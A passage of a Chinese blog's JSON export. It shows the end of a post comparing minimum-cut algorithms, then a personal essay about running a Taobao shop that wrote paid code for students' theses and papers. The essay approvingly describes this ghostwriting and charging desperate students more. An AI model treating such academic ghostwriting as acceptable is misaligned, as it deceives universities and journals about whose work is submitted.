class=\"line\"><span class=\"symbol\">3 </span><span class=\"number\">0</span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"symbol\">4 </span><span class=\"number\">2</span> <span class=\"number\">3</span></span><br></pre></td></tr></table></figure></p>\n<p>代表的图形是这样的<br><img src=\"/image/20150405234149.png\" alt=\"代表图\"></p>\n","excerpt":"<p>悲催的最小割之路<br>","more":"<br>无向图的最小割，几百年前就干过的事情。一直以来Stoer-Wagner算法一条路撸到黑。ACM集训队留下来的代码也是百试不爽。偶然间听说一种算法叫做Karger的也可以处理最小割问题。姑且拿来写一写试试看了。<br>最大流算法除外，其实目前看到的最小割算法都是基于把点粘合在一起来计算的。<br>先上传统Stoer-Wagner算法。</p>\n<p>##Stoer-Wagner##<br>这是一个神奇的算法。复杂度O($n^3$)。它利用最大生成树的原理来处理数据。算是有步骤地一步一步的找到该合并的点。具体操作如下<br>这个算法的关键在于一个定理，叫做“<strong>很简单的以至于不知道名字的定理</strong>”，如下:<br>在这个图中设定一个源点s，汇点t。假设我们现在已经求得了最小割<br>1，s，t两个节点分别在最小割后节点集的两部分，那么s-t的割就是最小割了<br>2，s，t两个节点都在最小割后节点集的一边，那么s-t合并之后，并不影响最小割的下一步求解<br>基于这个理论，我们可以得出一个算法的关键结论：<br>每次定义一组s，t。求出s-t的割，记录这个割，然后合并s-t。合并后我们就剩下n - 1个点。然后继续定义新的s-t。如果新的s-t的割小于原来的割，那么就更新最小割，继续合并新的s，t……直到最后变成两个点。<br>这样做可以照顾以上两点。因为如果每次操作s-t的时候，如果s-t确实是最后的割，那么我们记录了这个割。如果不是，那么我们合并继续。所以这个算法一定是对的。</p>\n<p>那么问题来了，怎么求s-t的割呢？<br>分成两个子问题。如果指定了s-t,我们可以使用最大流的各种算法来求出。但是现在没有指定s-t，我们可以在点里边任意选择s-t嘛。所以就引申出来一个算法，最大生成树。</p>\n<p>结论是这样的</p>\n<blockquote>\n<p>利用prim算法求最大生成树，每个节点不断的加入到图中，最后加入的两个节点之间的割，就等于最后一个加入节点距离源点的距离。也就是把倒数第二个加入的节点当作s，最后一个节点当作t，这个割就是最后一个节点的距离数</p>\n</blockquote>\n<p>证明</p>\n<blockquote>\n<p>我也不知道</p>\n</blockquote>\n<p>PS：这个证明我还在咨询大神，弄懂了再来更新<br>具体的算法操作代码放在最后。</p>\n<p>##Dinic##<br>也就是最大流啦。复杂度O($n^3$m)一个很著名的定理，最大流就是最小割。所以如果指定了最大流的源汇点，使用诸如SAP，Dinic等等的算法求出最大流，得到的结果就是最小割。<br>但是如果要求全局最小割呢，就需要枚举汇点了。不过上边的Stoer-Wagner算法有说，找到的源汇点是可以合并的。所以我们可以在每次Dinic求完最小割之后合并，再继续求下一个过程。复杂度可以显著降低。不过我觉得没必要了。还麻烦，直接枚举汇点好了。<br><strong>这种算法真的是没啥意思的，复杂度高还难写，为啥不用Stoer-Wagner呢，好写高效</strong><br>其实最大流算法和Stoer-Wagner的算法的最大区别在于，Stoer-Wagner使用了这个问题可以自己指定源点汇点的特点，方便的自行指定求出源汇点的割。最大流则是被动指定。效率肯定比不上Stoer-Wagner了。</p>\n<p>代码放在最后了啊</p>\n<p>##Karger##<br>这是一个神奇的算法！<br>说它神奇，是因为它简单。<br>说它神奇，是因为它复杂。<br>说它神奇，是因为这个算法太矛盾了。<br>话说当年Karger大牛在读博士的时候灵机一动，想出了这个空前绝后超级简单的算法。以至于后人无法再直视Karger。<br>这个算法的理论复杂度是O($n^2ln^{O(1)}n$),但是写出来后就不是这样的了。<br>首先这个算法是这样的。还是借用上边Stoer-Wagner的合并操作说明。Stoer-Wagner是找到s-t后合并s-t，但是Karger是在每次过程中，随机找一条边的两个点来合并。然后不断合并合并直到剩下两个点为止。然后这两个点中间的边就是最后的割了。这个割当然不一定是最小割。但是我们可以试嘛。论文说试上$n^2$次就可以达到满意的结果了。成吧。写写试试看？<br>本来这个算法很早就发明了。为啥到现在应用都不广泛呢？其中必有原因。写写后发现。实际上的复杂度要高得多。<br>$n^2$的迭代次数暂且不说。就说我们“随机取一条边”这个问题。如果我们用邻接表来存放数据点，那么随机取边就需要O(n)的复杂度了。因为毕竟我们要遍历嘛。如果用邻接矩阵来存放呢？我们需要不断的尝试边，然后看看有没有可用边。这个就看是稀疏图还是稠密图了。稀疏图就惨了，稠密图还好。<br>各种纠结，参考网上大牛代码后，决定用邻接表了。<br>优化了很久，发现不论如何，随机找边这个操作也在O(n)上，合并也几乎是O(n)。同时为了快速我用的指针，内存泄漏问题也不容忽视。同时中间还有无数个操作需要寻找一个点的位置。这种事情又是O(n)了。大体看了一下，如果是稠密图，因为我们每次迭代前都需要重新更新一下图数据，几乎是需要O($n^4$)的。。。</p>\n<p>代码细节：<br>邻接表中，每个点节点VNode存放的是每个节点，后边跟的一串是这个节点相连的边<br>每个ENode就是VNode连接的节点<br>所以这是一种看起来复杂度很低，实际上写起来微小操作特别耗时的算法。几乎还是不如Stoer-Wagner。<br>代码放在最后。。。</p>\n<p>##代码区域##<br>输入实例，完全按照邻接表的形式输入。不知道什么叫做邻接表的，看看这个实例也就懂了<br>每行的第一个数字，也就是VNode，表示这一行表示的点的标号<br>后边跟的一串是这个节点相连的边</p>\n<p>###input###<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">0 </span><span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"symbol\">1 </span><span class=\"number\">0</span> <span class=\"number\">2</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"symbol\">2 </span><span class=\"number\">0</span> <span class=\"number\">1</span> <span class=\"number\">3</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"symbol\">3 </span><span class=\"number\">0</span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"symbol\">4 </span><span class=\"number\">2</span> <span class=\"number\">3</span></span><br></pre></td></tr></table></figure></p>\n<p>代表的图形是这样的<br><img src=\"/image/20150405234149.png\" alt=\"代表图\"></p>"},{"title":"淘宝程序员的经历","date":"2015-05-31T10:57:10.000Z","_content":"*以下文字节选自我的德育报告*\n<!--more-->\n淘宝程序员的经历可以说是大学阶段仅次于ACM训练的一段神奇的经历了。我想用最大的篇幅写一下这一段时间对我的影响。\n\n话说刚开始的时候，我是没有想到要在淘宝开店代写程序的。主要是那一阵子缺钱，自己把自己逼的IBM工资已经不够用了，急需其他收入来填补自己的漏洞。话说这人要是急了真是什么办法都能想得出来，于是我的淘宝店铺就这么开张了，主营代写代码。\n![淘宝图](/image/taobao.png)\n要想在这个领域挣钱，要我说，就三点。胆子大，够狠心，有智商。\n\n所谓胆子大，就是什么都敢做。胆量来源于信心，信心来源于实力。奇怪的是我这人实力不出众，胆量却是很不错。本来觉得在淘宝帮别人写写代码没什么难的，真的客户来了就会发现，一个大学本科生要想挣点钱，还真是不容易。\n\n原因就是这些客户横跨全球各地，要求十分诡异。运输学的，经济学的，搞物流的，搞火车分发的，材料学的等等不一而足。实现的东西也多种多样，PHP网站，java程序，界面的，算法的等等。我一个大四学生哪有这种本事应付这么多技术，我也就用用c语言写个打印图形的水平而已好吧。而且看到淘宝上无数家店铺在做网站，所以我打定主意不做网站和app类，主要就剩下算法类了。尽管如此，面也是相当的广，不过好在我也不知道哪里来的自信，哪里来的胆量，还真敢做了。\n\n第一单是一个论文实现，好像有十来页的英文论文，实现一个材料学研究生的项目。嗯，别的不敢说，这个客户很有钱，而且很急。实现语言又是c语言，那我就试试呗。当时说好的每天600，大约三天，所以定价1800。对方倒也爽快，直接答应打钱。你说我啥时候一把挣过这么多钱啊！劲头十足好嘛。然后就开始看论文，开始写代码。后来想想遇到这样的开场真是我的幸事。一个经典的看起来很难其实不难的东西。三下五除二不到两天就出活了。第三天语音给客户一行一行的讲代码讲明白了，钱就到手了。\n\n当时那叫一开心啊！两天1800这个简直是神器啊！我小李子一辈子没见过这么多钱啊！然后就风生水起一发不可收拾了。不过这次的成功，马上被一次突如其来的失败所掩盖。\n\n第一单过后，又做了几单不大不小的活。过一阵子，那个第一单的人又来找我了。说是他们导师觉得他代码写得好，学习东西又快，让他出一个SCI的论文。这个论文的核心是要模拟一个流体的流动过程，用一个叫做palabos的库。他说这个比较难，给我6000块。\n\n诶我去，看到这个数字我整个人眼睛都变成￥.￥这种了好嘛。不接不是人啊！当时就拍拍胸脯说，没问题，我帮你弄了！这人还特别相信我，6000块直接打给我了，淘宝流程都不走的。我心想好吧，你这么相信我我可不能让你失望。\n\n随后的发生的事情，证明这个选择是我给自己挖下的一个硕大无朋的坑。\n\n由于对自己不知道哪里来的自信，我竟然把这个项目拖到了截止日期前三天才开始做。真正做起来了才发现，出问题了。\n\n首先是palabos，一个小众的不能再小众的库。除了官方网站之外基本查不到什么资料。然后是他们的专业知识。那可是材料学研究生的知识啊，流体力学，材料的渗透率，各种诡异的力学分析和数理学方法，都需要我去恶补。话说回来了，这个东西做出来直接就可以发SCI，对于一个外行来说，能不难么。然后我就度过了可以说是整个大学生涯最痛苦的三天。抱着各种英文论文学习一些根本不会用到的知识；联系所有能联系到的物理学，材料学的人请求支援，然而没有一个人是真正搞这个库的；到youtube上找视频学习；发邮件到这个库的开发团队问问题；全网寻找用这个库的实验室发邮件等等等等。\n\n俗话说皇天不负有心人，努力了这么久，终于，一无所获。\n\n（后来想想，这个结果正常啊，要是有人做了的话直接就发论文了还轮得到我么！）\n\n到了这个阶段，就剩下一天半的时间了。一咬牙一跺脚，不管了，自己死磕吧，做不出来就退款！\n\n然后在远程主机上配环境，搭好基本的框架，就开始自己跟自己死磕了。\n\n这个时候，智商真的就特别的重要了。纯看人家的代码来感觉一下物理学上这个是怎么回事，感觉一下用这个数理分析的方式是什么样子。看到一个函数过程就在大脑中浮现出水怎么流过一块砖头，流过的时候把砖头分成块，每个分子怎么相互撞击，怎么反弹。怎么给初速度，给不给恒定的压力，考虑不考虑重力因素等等等等等等。写过代码的人都知道，需要注意的细节太多了，更何况是这么大的一个过程。\n\n最终当截止日期还有一天的时候，只剩下一个关键问题了。\n\n这个问题给我的困扰，我编程这么久以来也算是相当恶心的。这是一个诡异的问题，是在运行过程中由于水流某部分过小，导致碰撞过程中某个地方出现真空，从而导致计算的时候发生除0错误，导致最后生成示意图的时候是纯黑色。但是当时我并不知道这个错误，看到的仅仅是图片黑了。别的啥都不知道啊。我一个程序员，哪想得到什么真空啦，什么极小值啦这些，调程序调的脸都绿了还是毫无进展，只能像砍了脑袋的公鸡一样乱试。要不怎么说，代码写不出来就要乱试，一个偶然的尝试，还真就成功了。然后顺着这个尝试分析一下，才知道怎么回事。到了这个地步，已经是截止日期的晚上了。\n\n恶心。真的是恶心。看到银行卡里的6000块，只是在心里说，每天2000的工资还真是不好挣的啊。\n\n上边那个程序过后，就陆陆续续的有各种各样的人来做各种各样的事情了。这时候我要说的就是第二点，要狠心。\n\n狠心这件事情貌似从来不存在于我的世界观中，我向来都是一个很宽厚老实的人。但是这样的话做淘宝程序员根本就没有竞争力，客户一哭穷自己就心软，这怎么行啊，毕竟人家说“我快揭不开锅了”的时候，说不定还左手兰博基尼的方向盘，右手大美女呢！然后把自己要做的事情扔给对着破电脑的我，拿着我的成果去实现他的目的。该狠心的时候心不狠，根本没法立足，毕竟我们面对的是一个勾心斗角的社会。\n\n怎么狠心呢？不能乱狠心。淘宝这块地，就在于人多，你要贵了人家自然去找便宜的。淘宝程序员总体来说工资还是低的不行，毕竟大家都一样，像牲口一样拼命的人才能拿到更多的钱，应该说是处在程序员圈子的最底层。在这一块地盘上要有高收入，必须要有点想法。所以我在店铺中直接说，不做PHP，不做网站，不做APP，只做论文实现，算法研究。这个就很好了，毕竟淘宝上大批量的全是做工程的，同时做工程的要求比较低，技校培训几个月出来就能做了。但是算法，论文这些事情可不是谁都能做的。所以一段时间之后，出现了这么个景象。\n\n“大神！帮我做做这个吧，马上就要截止了”\n\n“啊，其实我最近特别忙，不太有空，你去别家店问问，不然在我这里可能会很贵”\n\n“哦，好的！”\n\n然后过了一两天，他就又回来了。\n\n“那个时间太紧了，我还是找您吧”\n\n“别的家没人能做了嘛？”\n\n“没有了，他们都是做工程的，没人接这种活。”\n\n话说道这份上了，还说啥？坐地起价呗！对于他来说，要不不做毕不了业，要不花点钱买代码，贵点也就贵点了，毕竟研究生毕业一辈子就一次。（再说也不是很贵，研究生毕设代码1000~2000的样子）\n\n然后就是客户的纠结了。他们哭穷，我心软，然后各种划价，一般也就稳定在一两天的工作量1000~2000收费的样子了。（这对于大四学生来说已经是很高的收入了啊）\n\n别看钱多，真不好拿。没智商不行，没胆量不行。很多时候，可以说80%的时候，他们的论文都是有问题的。基本都是研究的一般的人，随便不知道怎么抄来的公式和方法，强行用在里边，基础的错误一大堆。自己要先看论文，推公式，找出问题跟他说，改论文，然后写代码。和那个最恶心的程序差不多，人家是火车调度的，自己就要现学火车调度，然后才能理解论文，才能推导论文逻辑。人家是物流的，就要现学物流。人家是搞流体的，就要现学物理。算法上更才是各种各样，各种听说过的没听说过的算法都往过来招呼。\n\n很多时候，客户来描述问题，一个完全没接触过的领域加上一个完全没听说过的算法。作为我来说，有胆量就接！然后开始学他们的专业知识，学这个没听说过的算法。然后定价，然后全部代码手写一遍，调试通过，最后交工。这其中各种客户都有，有啥都不懂混日子的，只知道花多少钱买到什么代码；有啥都不懂但是很认真的，要看到真实的数据运行过程和运行结果；比较好的情况是自己有底子但是代码能力不够写不好，还特别认真的。代码写的时候比较爽，问什么问题他都能清楚的回答，交工后他会一句一句看代码，然后简单明了的问我一些问题，指出哪里写得好哪里不好。给这种人写代码，收获也是最大的。\n\n这一段经历，让我看到了各种各样的人，学习了各种各样的算法，写了各种各样的工程，真的是收获太多了。也正是这一段经历，让我更加自信，更加有胆量。以至于最后做毕设的时候，凭着无敌的胆量，选了一个导师和学长都摇头的觉得难度太大的方法。用小伙伴的话说，虽然我们都是研究性的，但是不太一样。举个栗子，一般的研究都是研究在windows系统上写个qq，我的工作就是觉得windows系统不太好用，自己要写个专用的操作系统然后再写个qq。其实没这么夸张，但是也真是初生牛犊不怕虎，啥都敢写。虽然事实证明这确实是我自己给自己挖的一个大坑。逻辑复杂，对计算机理解不够，方法设计不科学，实验效果极差。但是毕竟也是一次尝试，总比做别人早已做过的东西要好。","source":"_posts/U6dd8U5b9dU7a0bU5e8fU5458U7684U7ecfU5386.md","raw":"title: \"淘宝程序员的经历\"\ndate: 2015-05-31 10:57:10\ntags: Notes\ncategories: Notes\n---\n*以下文字节选自我的德育报告*\n<!--more-->\n淘宝程序员的经历可以说是大学阶段仅次于ACM训练的一段神奇的经历了。我想用最大的篇幅写一下这一段时间对我的影响。\n\n话说刚开始的时候，我是没有想到要在淘宝开店代写程序的。主要是那一阵子缺钱，自己把自己逼的IBM工资已经不够用了，急需其他收入来填补自己的漏洞。话说这人要是急了真是什么办法都能想得出来，于是我的淘宝店铺就这么开张了，主营代写代码。\n![淘宝图](/image/taobao.png)\n要想在这个领域挣钱，要我说，就三点。胆子大，够狠心，有智商。\n\n所谓胆子大，就是什么都敢做。胆量来源于信心，信心来源于实力。奇怪的是我这人实力不出众，胆量却是很不错。本来觉得在淘宝帮别人写写代码没什么难的，真的客户来了就会发现，一个大学本科生要想挣点钱，还真是不容易。\n\n原因就是这些客户横跨全球各地，要求十分诡异。运输学的，经济学的，搞物流的，搞火车分发的，材料学的等等不一而足。实现的东西也多种多样，PHP网站，java程序，界面的，算法的等等。我一个大四学生哪有这种本事应付这么多技术，我也就用用c语言写个打印图形的水平而已好吧。而且看到淘宝上无数家店铺在做网站，所以我打定主意不做网站和app类，主要就剩下算法类了。尽管如此，面也是相当的广，不过好在我也不知道哪里来的自信，哪里来的胆量，还真敢做了。\n\n第一单是一个论文实现，好像有十来页的英文论文，实现一个材料学研究生的项目。嗯，别的不敢说，这个客户很有钱，而且很急。实现语言又是c语言，那我就试试呗。当时说好的每天600，大约三天，所以定价1800。对方倒也爽快，直接答应打钱。你说我啥时候一把挣过这么多钱啊！劲头十足好嘛。然后就开始看论文，开始写代码。后来想想遇到这样的开场真是我的幸事。一个经典的看起来很难其实不难的东西。三下五除二不到两天就出活了。第三天语音给客户一行一行的讲代码讲明白了，钱就到手了。\n\n当时那叫一开心啊！两天1800这个简直是神器啊！我小李子一辈子没见过这么多钱啊！然后就风生水起一发不可收拾了。不过这次的成功，马上被一次突如其来的失败所掩盖。\n\n第一单过后，又做了几单不大不小的活。过一阵子，那个第一单的人又来找我了。说是他们导师觉得他代码写得好，学习东西又快，让他出一个SCI的论文。这个论文的核心是要模拟一个流体的流动过程，用一个叫做palabos的库。他说这个比较难，给我6000块。\n\n诶我去，看到这个数字我整个人眼睛都变成￥.￥这种了好嘛。不接不是人啊！当时就拍拍胸脯说，没问题，我帮你弄了！这人还特别相信我，6000块直接打给我了，淘宝流程都不走的。我心想好吧，你这么相信我我可不能让你失望。\n\n随后的发生的事情，证明这个选择是我给自己挖下的一个硕大无朋的坑。\n\n由于对自己不知道哪里来的自信，我竟然把这个项目拖到了截止日期前三天才开始做。真正做起来了才发现，出问题了。\n\n首先是palabos，一个小众的不能再小众的库。除了官方网站之外基本查不到什么资料。然后是他们的专业知识。那可是材料学研究生的知识啊，流体力学，材料的渗透率，各种诡异的力学分析和数理学方法，都需要我去恶补。话说回来了，这个东西做出来直接就可以发SCI，对于一个外行来说，能不难么。然后我就度过了可以说是整个大学生涯最痛苦的三天。抱着各种英文论文学习一些根本不会用到的知识；联系所有能联系到的物理学，材料学的人请求支援，然而没有一个人是真正搞这个库的；到youtube上找视频学习；发邮件到这个库的开发团队问问题；全网寻找用这个库的实验室发邮件等等等等。\n\n俗话说皇天不负有心人，努力了这么久，终于，一无所获。\n\n（后来想想，这个结果正常啊，要是有人做了的话直接就发论文了还轮得到我么！）\n\n到了这个阶段，就剩下一天半的时间了。一咬牙一跺脚，不管了，自己死磕吧，做不出来就退款！\n\n然后在远程主机上配环境，搭好基本的框架，就开始自己跟自己死磕了。\n\n这个时候，智商真的就特别的重要了。纯看人家的代码来感觉一下物理学上这个是怎么回事，感觉一下用这个数理分析的方式是什么样子。看到一个函数过程就在大脑中浮现出水怎么流过一块砖头，流过的时候把砖头分成块，每个分子怎么相互撞击，怎么反弹。怎么给初速度，给不给恒定的压力，考虑不考虑重力因素等等等等等等。写过代码的人都知道，需要注意的细节太多了，更何况是这么大的一个过程。\n\n最终当截止日期还有一天的时候，只剩下一个关键问题了。\n\n这个问题给我的困扰，我编程这么久以来也算是相当恶心的。这是一个诡异的问题，是在运行过程中由于水流某部分过小，导致碰撞过程中某个地方出现真空，从而导致计算的时候发生除0错误，导致最后生成示意图的时候是纯黑色。但是当时我并不知道这个错误，看到的仅仅是图片黑了。别的啥都不知道啊。我一个程序员，哪想得到什么真空啦，什么极小值啦这些，调程序调的脸都绿了还是毫无进展，只能像砍了脑袋的公鸡一样乱试。要不怎么说，代码写不出来就要乱试，一个偶然的尝试，还真就成功了。然后顺着这个尝试分析一下，才知道怎么回事。到了这个地步，已经是截止日期的晚上了。\n\n恶心。真的是恶心。看到银行卡里的6000块，只是在心里说，每天2000的工资还真是不好挣的啊。\n\n上边那个程序过后，就陆陆续续的有各种各样的人来做各种各样的事情了。这时候我要说的就是第二点，要狠心。\n\n狠心这件事情貌似从来不存在于我的世界观中，我向来都是一个很宽厚老实的人。但是这样的话做淘宝程序员根本就没有竞争力，客户一哭穷自己就心软，这怎么行啊，毕竟人家说“我快揭不开锅了”的时候，说不定还左手兰博基尼的方向盘，右手大美女呢！然后把自己要做的事情扔给对着破电脑的我，拿着我的成果去实现他的目的。该狠心的时候心不狠，根本没法立足，毕竟我们面对的是一个勾心斗角的社会。\n\n怎么狠心呢？不能乱狠心。淘宝这块地，就在于人多，你要贵了人家自然去找便宜的。淘宝程序员总体来说工资还是低的不行，毕竟大家都一样，像牲口一样拼命的人才能拿到更多的钱，应该说是处在程序员圈子的最底层。在这一块地盘上要有高收入，必须要有点想法。所以我在店铺中直接说，不做PHP，不做网站，不做APP，只做论文实现，算法研究。这个就很好了，毕竟淘宝上大批量的全是做工程的，同时做工程的要求比较低，技校培训几个月出来就能做了。但是算法，论文这些事情可不是谁都能做的。所以一段时间之后，出现了这么个景象。\n\n“大神！帮我做做这个吧，马上就要截止了”\n\n“啊，其实我最近特别忙，不太有空，你去别家店问问，不然在我这里可能会很贵”\n\n“哦，好的！”\n\n然后过了一两天，他就又回来了。\n\n“那个时间太紧了，我还是找您吧”\n\n“别的家没人能做了嘛？”\n\n“没有了，他们都是做工程的，没人接这种活。”\n\n话说道这份上了，还说啥？坐地起价呗！对于他来说，要不不做毕不了业，要不花点钱买代码，贵点也就贵点了，毕竟研究生毕业一辈子就一次。（再说也不是很贵，研究生毕设代码1000~2000的样子）\n\n然后就是客户的纠结了。他们哭穷，我心软，然后各种划价，一般也就稳定在一两天的工作量1000~2000收费的样子了。（这对于大四学生来说已经是很高的收入了啊）\n\n别看钱多，真不好拿。没智商不行，没胆量不行。很多时候，可以说80%的时候，他们的论文都是有问题的。基本都是研究的一般的人，随便不知道怎么抄来的公式和方法，强行用在里边，基础的错误一大堆。自己要先看论文，推公式，找出问题跟他说，改论文，然后写代码。和那个最恶心的程序差不多，人家是火车调度的，自己就要现学火车调度，然后才能理解论文，才能推导论文逻辑。人家是物流的，就要现学物流。人家是搞流体的，就要现学物理。算法上更才是各种各样，各种听说过的没听说过的算法都往过来招呼。\n\n很多时候，客户来描述问题，一个完全没接触过的领域加上一个完全没听说过的算法。作为我来说，有胆量就接！然后开始学他们的专业知识，学这个没听说过的算法。然后定价，然后全部代码手写一遍，调试通过，最后交工。这其中各种客户都有，有啥都不懂混日子的，只知道花多少钱买到什么代码；有啥都不懂但是很认真的，要看到真实的数据运行过程和运行结果；比较好的情况是自己有底子但是代码能力不够写不好，还特别认真的。代码写的时候比较爽，问什么问题他都能清楚的回答，交工后他会一句一句看代码，然后简单明了的问我一些问题，指出哪里写得好哪里不好。给这种人写代码，收获也是最大的。\n\n这一段经历，让我看到了各种各样的人，学习了各种各样的算法，写了各种各样的工程，真的是收获太多了。也正是这一段经历，让我更加自信，更加有胆量。以至于最后做毕设的时候，凭着无敌的胆量，选了一个导师和学长都摇头的觉得难度太大的方法。用小伙伴的话说，虽然我们都是研究性的，但是不太一样。举个栗子，一般的研究都是研究在windows系统上写个qq，我的工作就是觉得windows系统不太好用，自己要写个专用的操作系统然后再写个qq。其实没这么夸张，但是也真是初生牛犊不怕虎，啥都敢写。虽然事实证明这确实是我自己给自己挖的一个大坑。逻辑复杂，对计算机理解不够，方法设计不科学，实验效果极差。但是毕竟也是一次尝试，总比做别人早已做过的东西要好。","slug":"U6dd8U5b9dU7a0bU5e8fU5458U7684U7ecfU5386","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vb001xwypdkcs8cmcf","content":"<p><em>以下文字节选自我的德育报告</em><br><a id=\"more\"></a><br>淘宝程序员的经历可以说是大学阶段仅次于ACM训练的一段神奇的经历了。我想用最大的篇幅写一下这一段时间对我的影响。</p>\n<p>话说刚开始的时候，我是没有想到要在淘宝开店代写程序的。主要是那一阵子缺钱，自己把自己逼的IBM工资已经不够用了，急需其他收入来填补自己的漏洞。话说这人要是急了真是什么办法都能想得出来，于是我的淘宝店铺就这么开张了，主营代写代码。<br><img src=\"/image/taobao.png\" alt=\"淘宝图\"><br>要想在这个领域挣钱，要我说，就三点。胆子大，够狠心，有智商。</p>\n<p>所谓胆子大，就是什么都敢做。胆量来源于信心，信心来源于实力。奇怪的是我这人实力不出众，胆量却是很不错。本来觉得在淘宝帮别人写写代码没什么难的，真的客户来了就会发现，一个大学本科生要想挣点钱，还真是不容易。</p>\n<p>原因就是这些客户横跨全球各地，要求十分诡异。运输学的，经济学的，搞物流的，搞火车分发的，材料学的等等不一而足。实现的东西也多种多样，PHP网站，java程序，界面的，算法的等等。我一个大四学生哪有这种本事应付这么多技术，我也就用用c语言写个打印图形的水平而已好吧。而且看到淘宝上无数家店铺在做网站，所以我打定主意不做网站和app类，主要就剩下算法类了。尽管如此，面也是相当的广，不过好在我也不知道哪里来的自信，哪里来的胆量，还真敢做了。</p>\n<p>第一单是一个论文实现，好像有十来页的英文论文，实现一个材料学研究生的项目。嗯，别的不敢说，这个客户很有钱，而且很急。实现语言又是c语言，那我就试试呗。当时说好的每天600，大约三天，所以定价1800。对方倒也爽快，直接答应打钱。你说我啥时候一把挣过这么多钱啊！劲头十足好嘛。然后就开始看论文，开始写代码。后来想想遇到这样的开场真是我的幸事。一个经典的看起来很难其实不难的东西。三下五除二不到两天就出活了。第三天语音给客户一行一行的讲代码讲明白了，钱就到手了。</p>\n<p>当时那叫一开心啊！两天1800这个简直是神器啊！我小李子一辈子没见过这么多钱啊！然后就风生水起一发不可收拾了。不过这次的成功，马上被一次突如其来的失败所掩盖。</p>\n<p>第一单过后，又做了几单不大不小的活。过一阵子，那个第一单的人又来找我了。说是他们导师觉得他代码写得好，学习东西又快，让他出一个SCI的论文。这个论文的核心是要模拟一个流体的流动过程，用一个叫做palabos的库。他说这个比较难，给我6000块。</p>\n<p>诶我去，看到这个数字我整个人眼睛都变成￥.￥这种了好嘛。不接不是人啊！当时就拍拍胸脯说，没问题，我帮你弄了！这人还特别相信我，6000块直接打给我了，淘宝流程都不走的。我心想好吧，你这么相信我我可不能让你失望。</p>\n<p>随后的发生的事情，证明这个选择是我给自己挖下的一个硕大无朋的坑。</p>\n<p>由于对自己不知道哪里来的自信，我竟然把这个项目拖到了截止日期前三天才开始做。真正做起来了才发现，出问题了。</p>\n<p>首先是palabos，一个小众的不能再小众的库。除了官方网站之外基本查不到什么资料。然后是他们的专业知识。那可是材料学研究生的知识啊，流体力学，材料的渗透率，各种诡异的力学分析和数理学方法，都需要我去恶补。话说回来了，这个东西做出来直接就可以发SCI，对于一个外行来说，能不难么。然后我就度过了可以说是整个大学生涯最痛苦的三天。抱着各种英文论文学习一些根本不会用到的知识；联系所有能联系到的物理学，材料学的人请求支援，然而没有一个人是真正搞这个库的；到youtube上找视频学习；发邮件到这个库的开发团队问问题；全网寻找用这个库的实验室发邮件等等等等。</p>\n<p>俗话说皇天不负有心人，努力了这么久，终于，一无所获。</p>\n<p>（后来想想，这个结果正常啊，要是有人做了的话直接就发论文了还轮得到我么！）</p>\n<p>到了这个阶段，就剩下一天半的时间了。一咬牙一跺脚，不管了，自己死磕吧，做不出来就退款！</p>\n<p>然后在远程主机上配环境，搭好基本的框架，就开始自己跟自己死磕了。</p>\n<p>这个时候，智商真的就特别的重要了。纯看人家的代码来感觉一下物理学上这个是怎么回事，感觉一下用这个数理分析的方式是什么样子。看到一个函数过程就在大脑中浮现出水怎么流过一块砖头，流过的时候把砖头分成块，每个分子怎么相互撞击，怎么反弹。怎么给初速度，给不给恒定的压力，考虑不考虑重力因素等等等等等等。写过代码的人都知道，需要注意的细节太多了，更何况是这么大的一个过程。</p>\n<p>最终当截止日期还有一天的时候，只剩下一个关键问题了。</p>\n<p>这个问题给我的困扰，我编程这么久以来也算是相当恶心的。这是一个诡异的问题，是在运行过程中由于水流某部分过小，导致碰撞过程中某个地方出现真空，从而导致计算的时候发生除0错误，导致最后生成示意图的时候是纯黑色。但是当时我并不知道这个错误，看到的仅仅是图片黑了。别的啥都不知道啊。我一个程序员，哪想得到什么真空啦，什么极小值啦这些，调程序调的脸都绿了还是毫无进展，只能像砍了脑袋的公鸡一样乱试。要不怎么说，代码写不出来就要乱试，一个偶然的尝试，还真就成功了。然后顺着这个尝试分析一下，才知道怎么回事。到了这个地步，已经是截止日期的晚上了。</p>\n<p>恶心。真的是恶心。看到银行卡里的6000块，只是在心里说，每天2000的工资还真是不好挣的啊。</p>\n<p>上边那个程序过后，就陆陆续续的有各种各样的人来做各种各样的事情了。这时候我要说的就是第二点，要狠心。</p>\n<p>狠心这件事情貌似从来不存在于我的世界观中，我向来都是一个很宽厚老实的人。但是这样的话做淘宝程序员根本就没有竞争力，客户一哭穷自己就心软，这怎么行啊，毕竟人家说“我快揭不开锅了”的时候，说不定还左手兰博基尼的方向盘，右手大美女呢！然后把自己要做的事情扔给对着破电脑的我，拿着我的成果去实现他的目的。该狠心的时候心不狠，根本没法立足，毕竟我们面对的是一个勾心斗角的社会。</p>\n<p>怎么狠心呢？不能乱狠心。淘宝这块地，就在于人多，你要贵了人家自然去找便宜的。淘宝程序员总体来说工资还是低的不行，毕竟大家都一样，像牲口一样拼命的人才能拿到更多的钱，应该说是处在程序员圈子的最底层。在这一块地盘上要有高收入，必须要有点想法。所以我在店铺中直接说，不做PHP，不做网站，不做APP，只做论文实现，算法研究。这个就很好了，毕竟淘宝上大批量的全是做工程的，同时做工程的要求比较低，技校培训几个月出来就能做了。但是算法，论文这些事情可不是谁都能做的。所以一段时间之后，出现了这么个景象。</p>\n<p>“大神！帮我做做这个吧，马上就要截止了”</p>\n<p>“啊，其实我最近特别忙，不太有空，你去别家店问问，不然在我这里可能会很贵”</p>\n<p>“哦，好的！”</p>\n<p>然后过了一两天，他就又回来了。</p>\n<p>“那个时间太紧了，我还是找您吧”</p>\n<p>“别的家没人能做了嘛？”</p>\n<p>“没有了，他们都是做工程的，没人接这种活。”</p>\n<p>话说道这份上了，还说啥？坐地起价呗！对于他来说，要不不做毕不了业，要不花点钱买代码，贵点也就贵点了，毕竟研究生毕业一辈子就一次。（再说也不是很贵，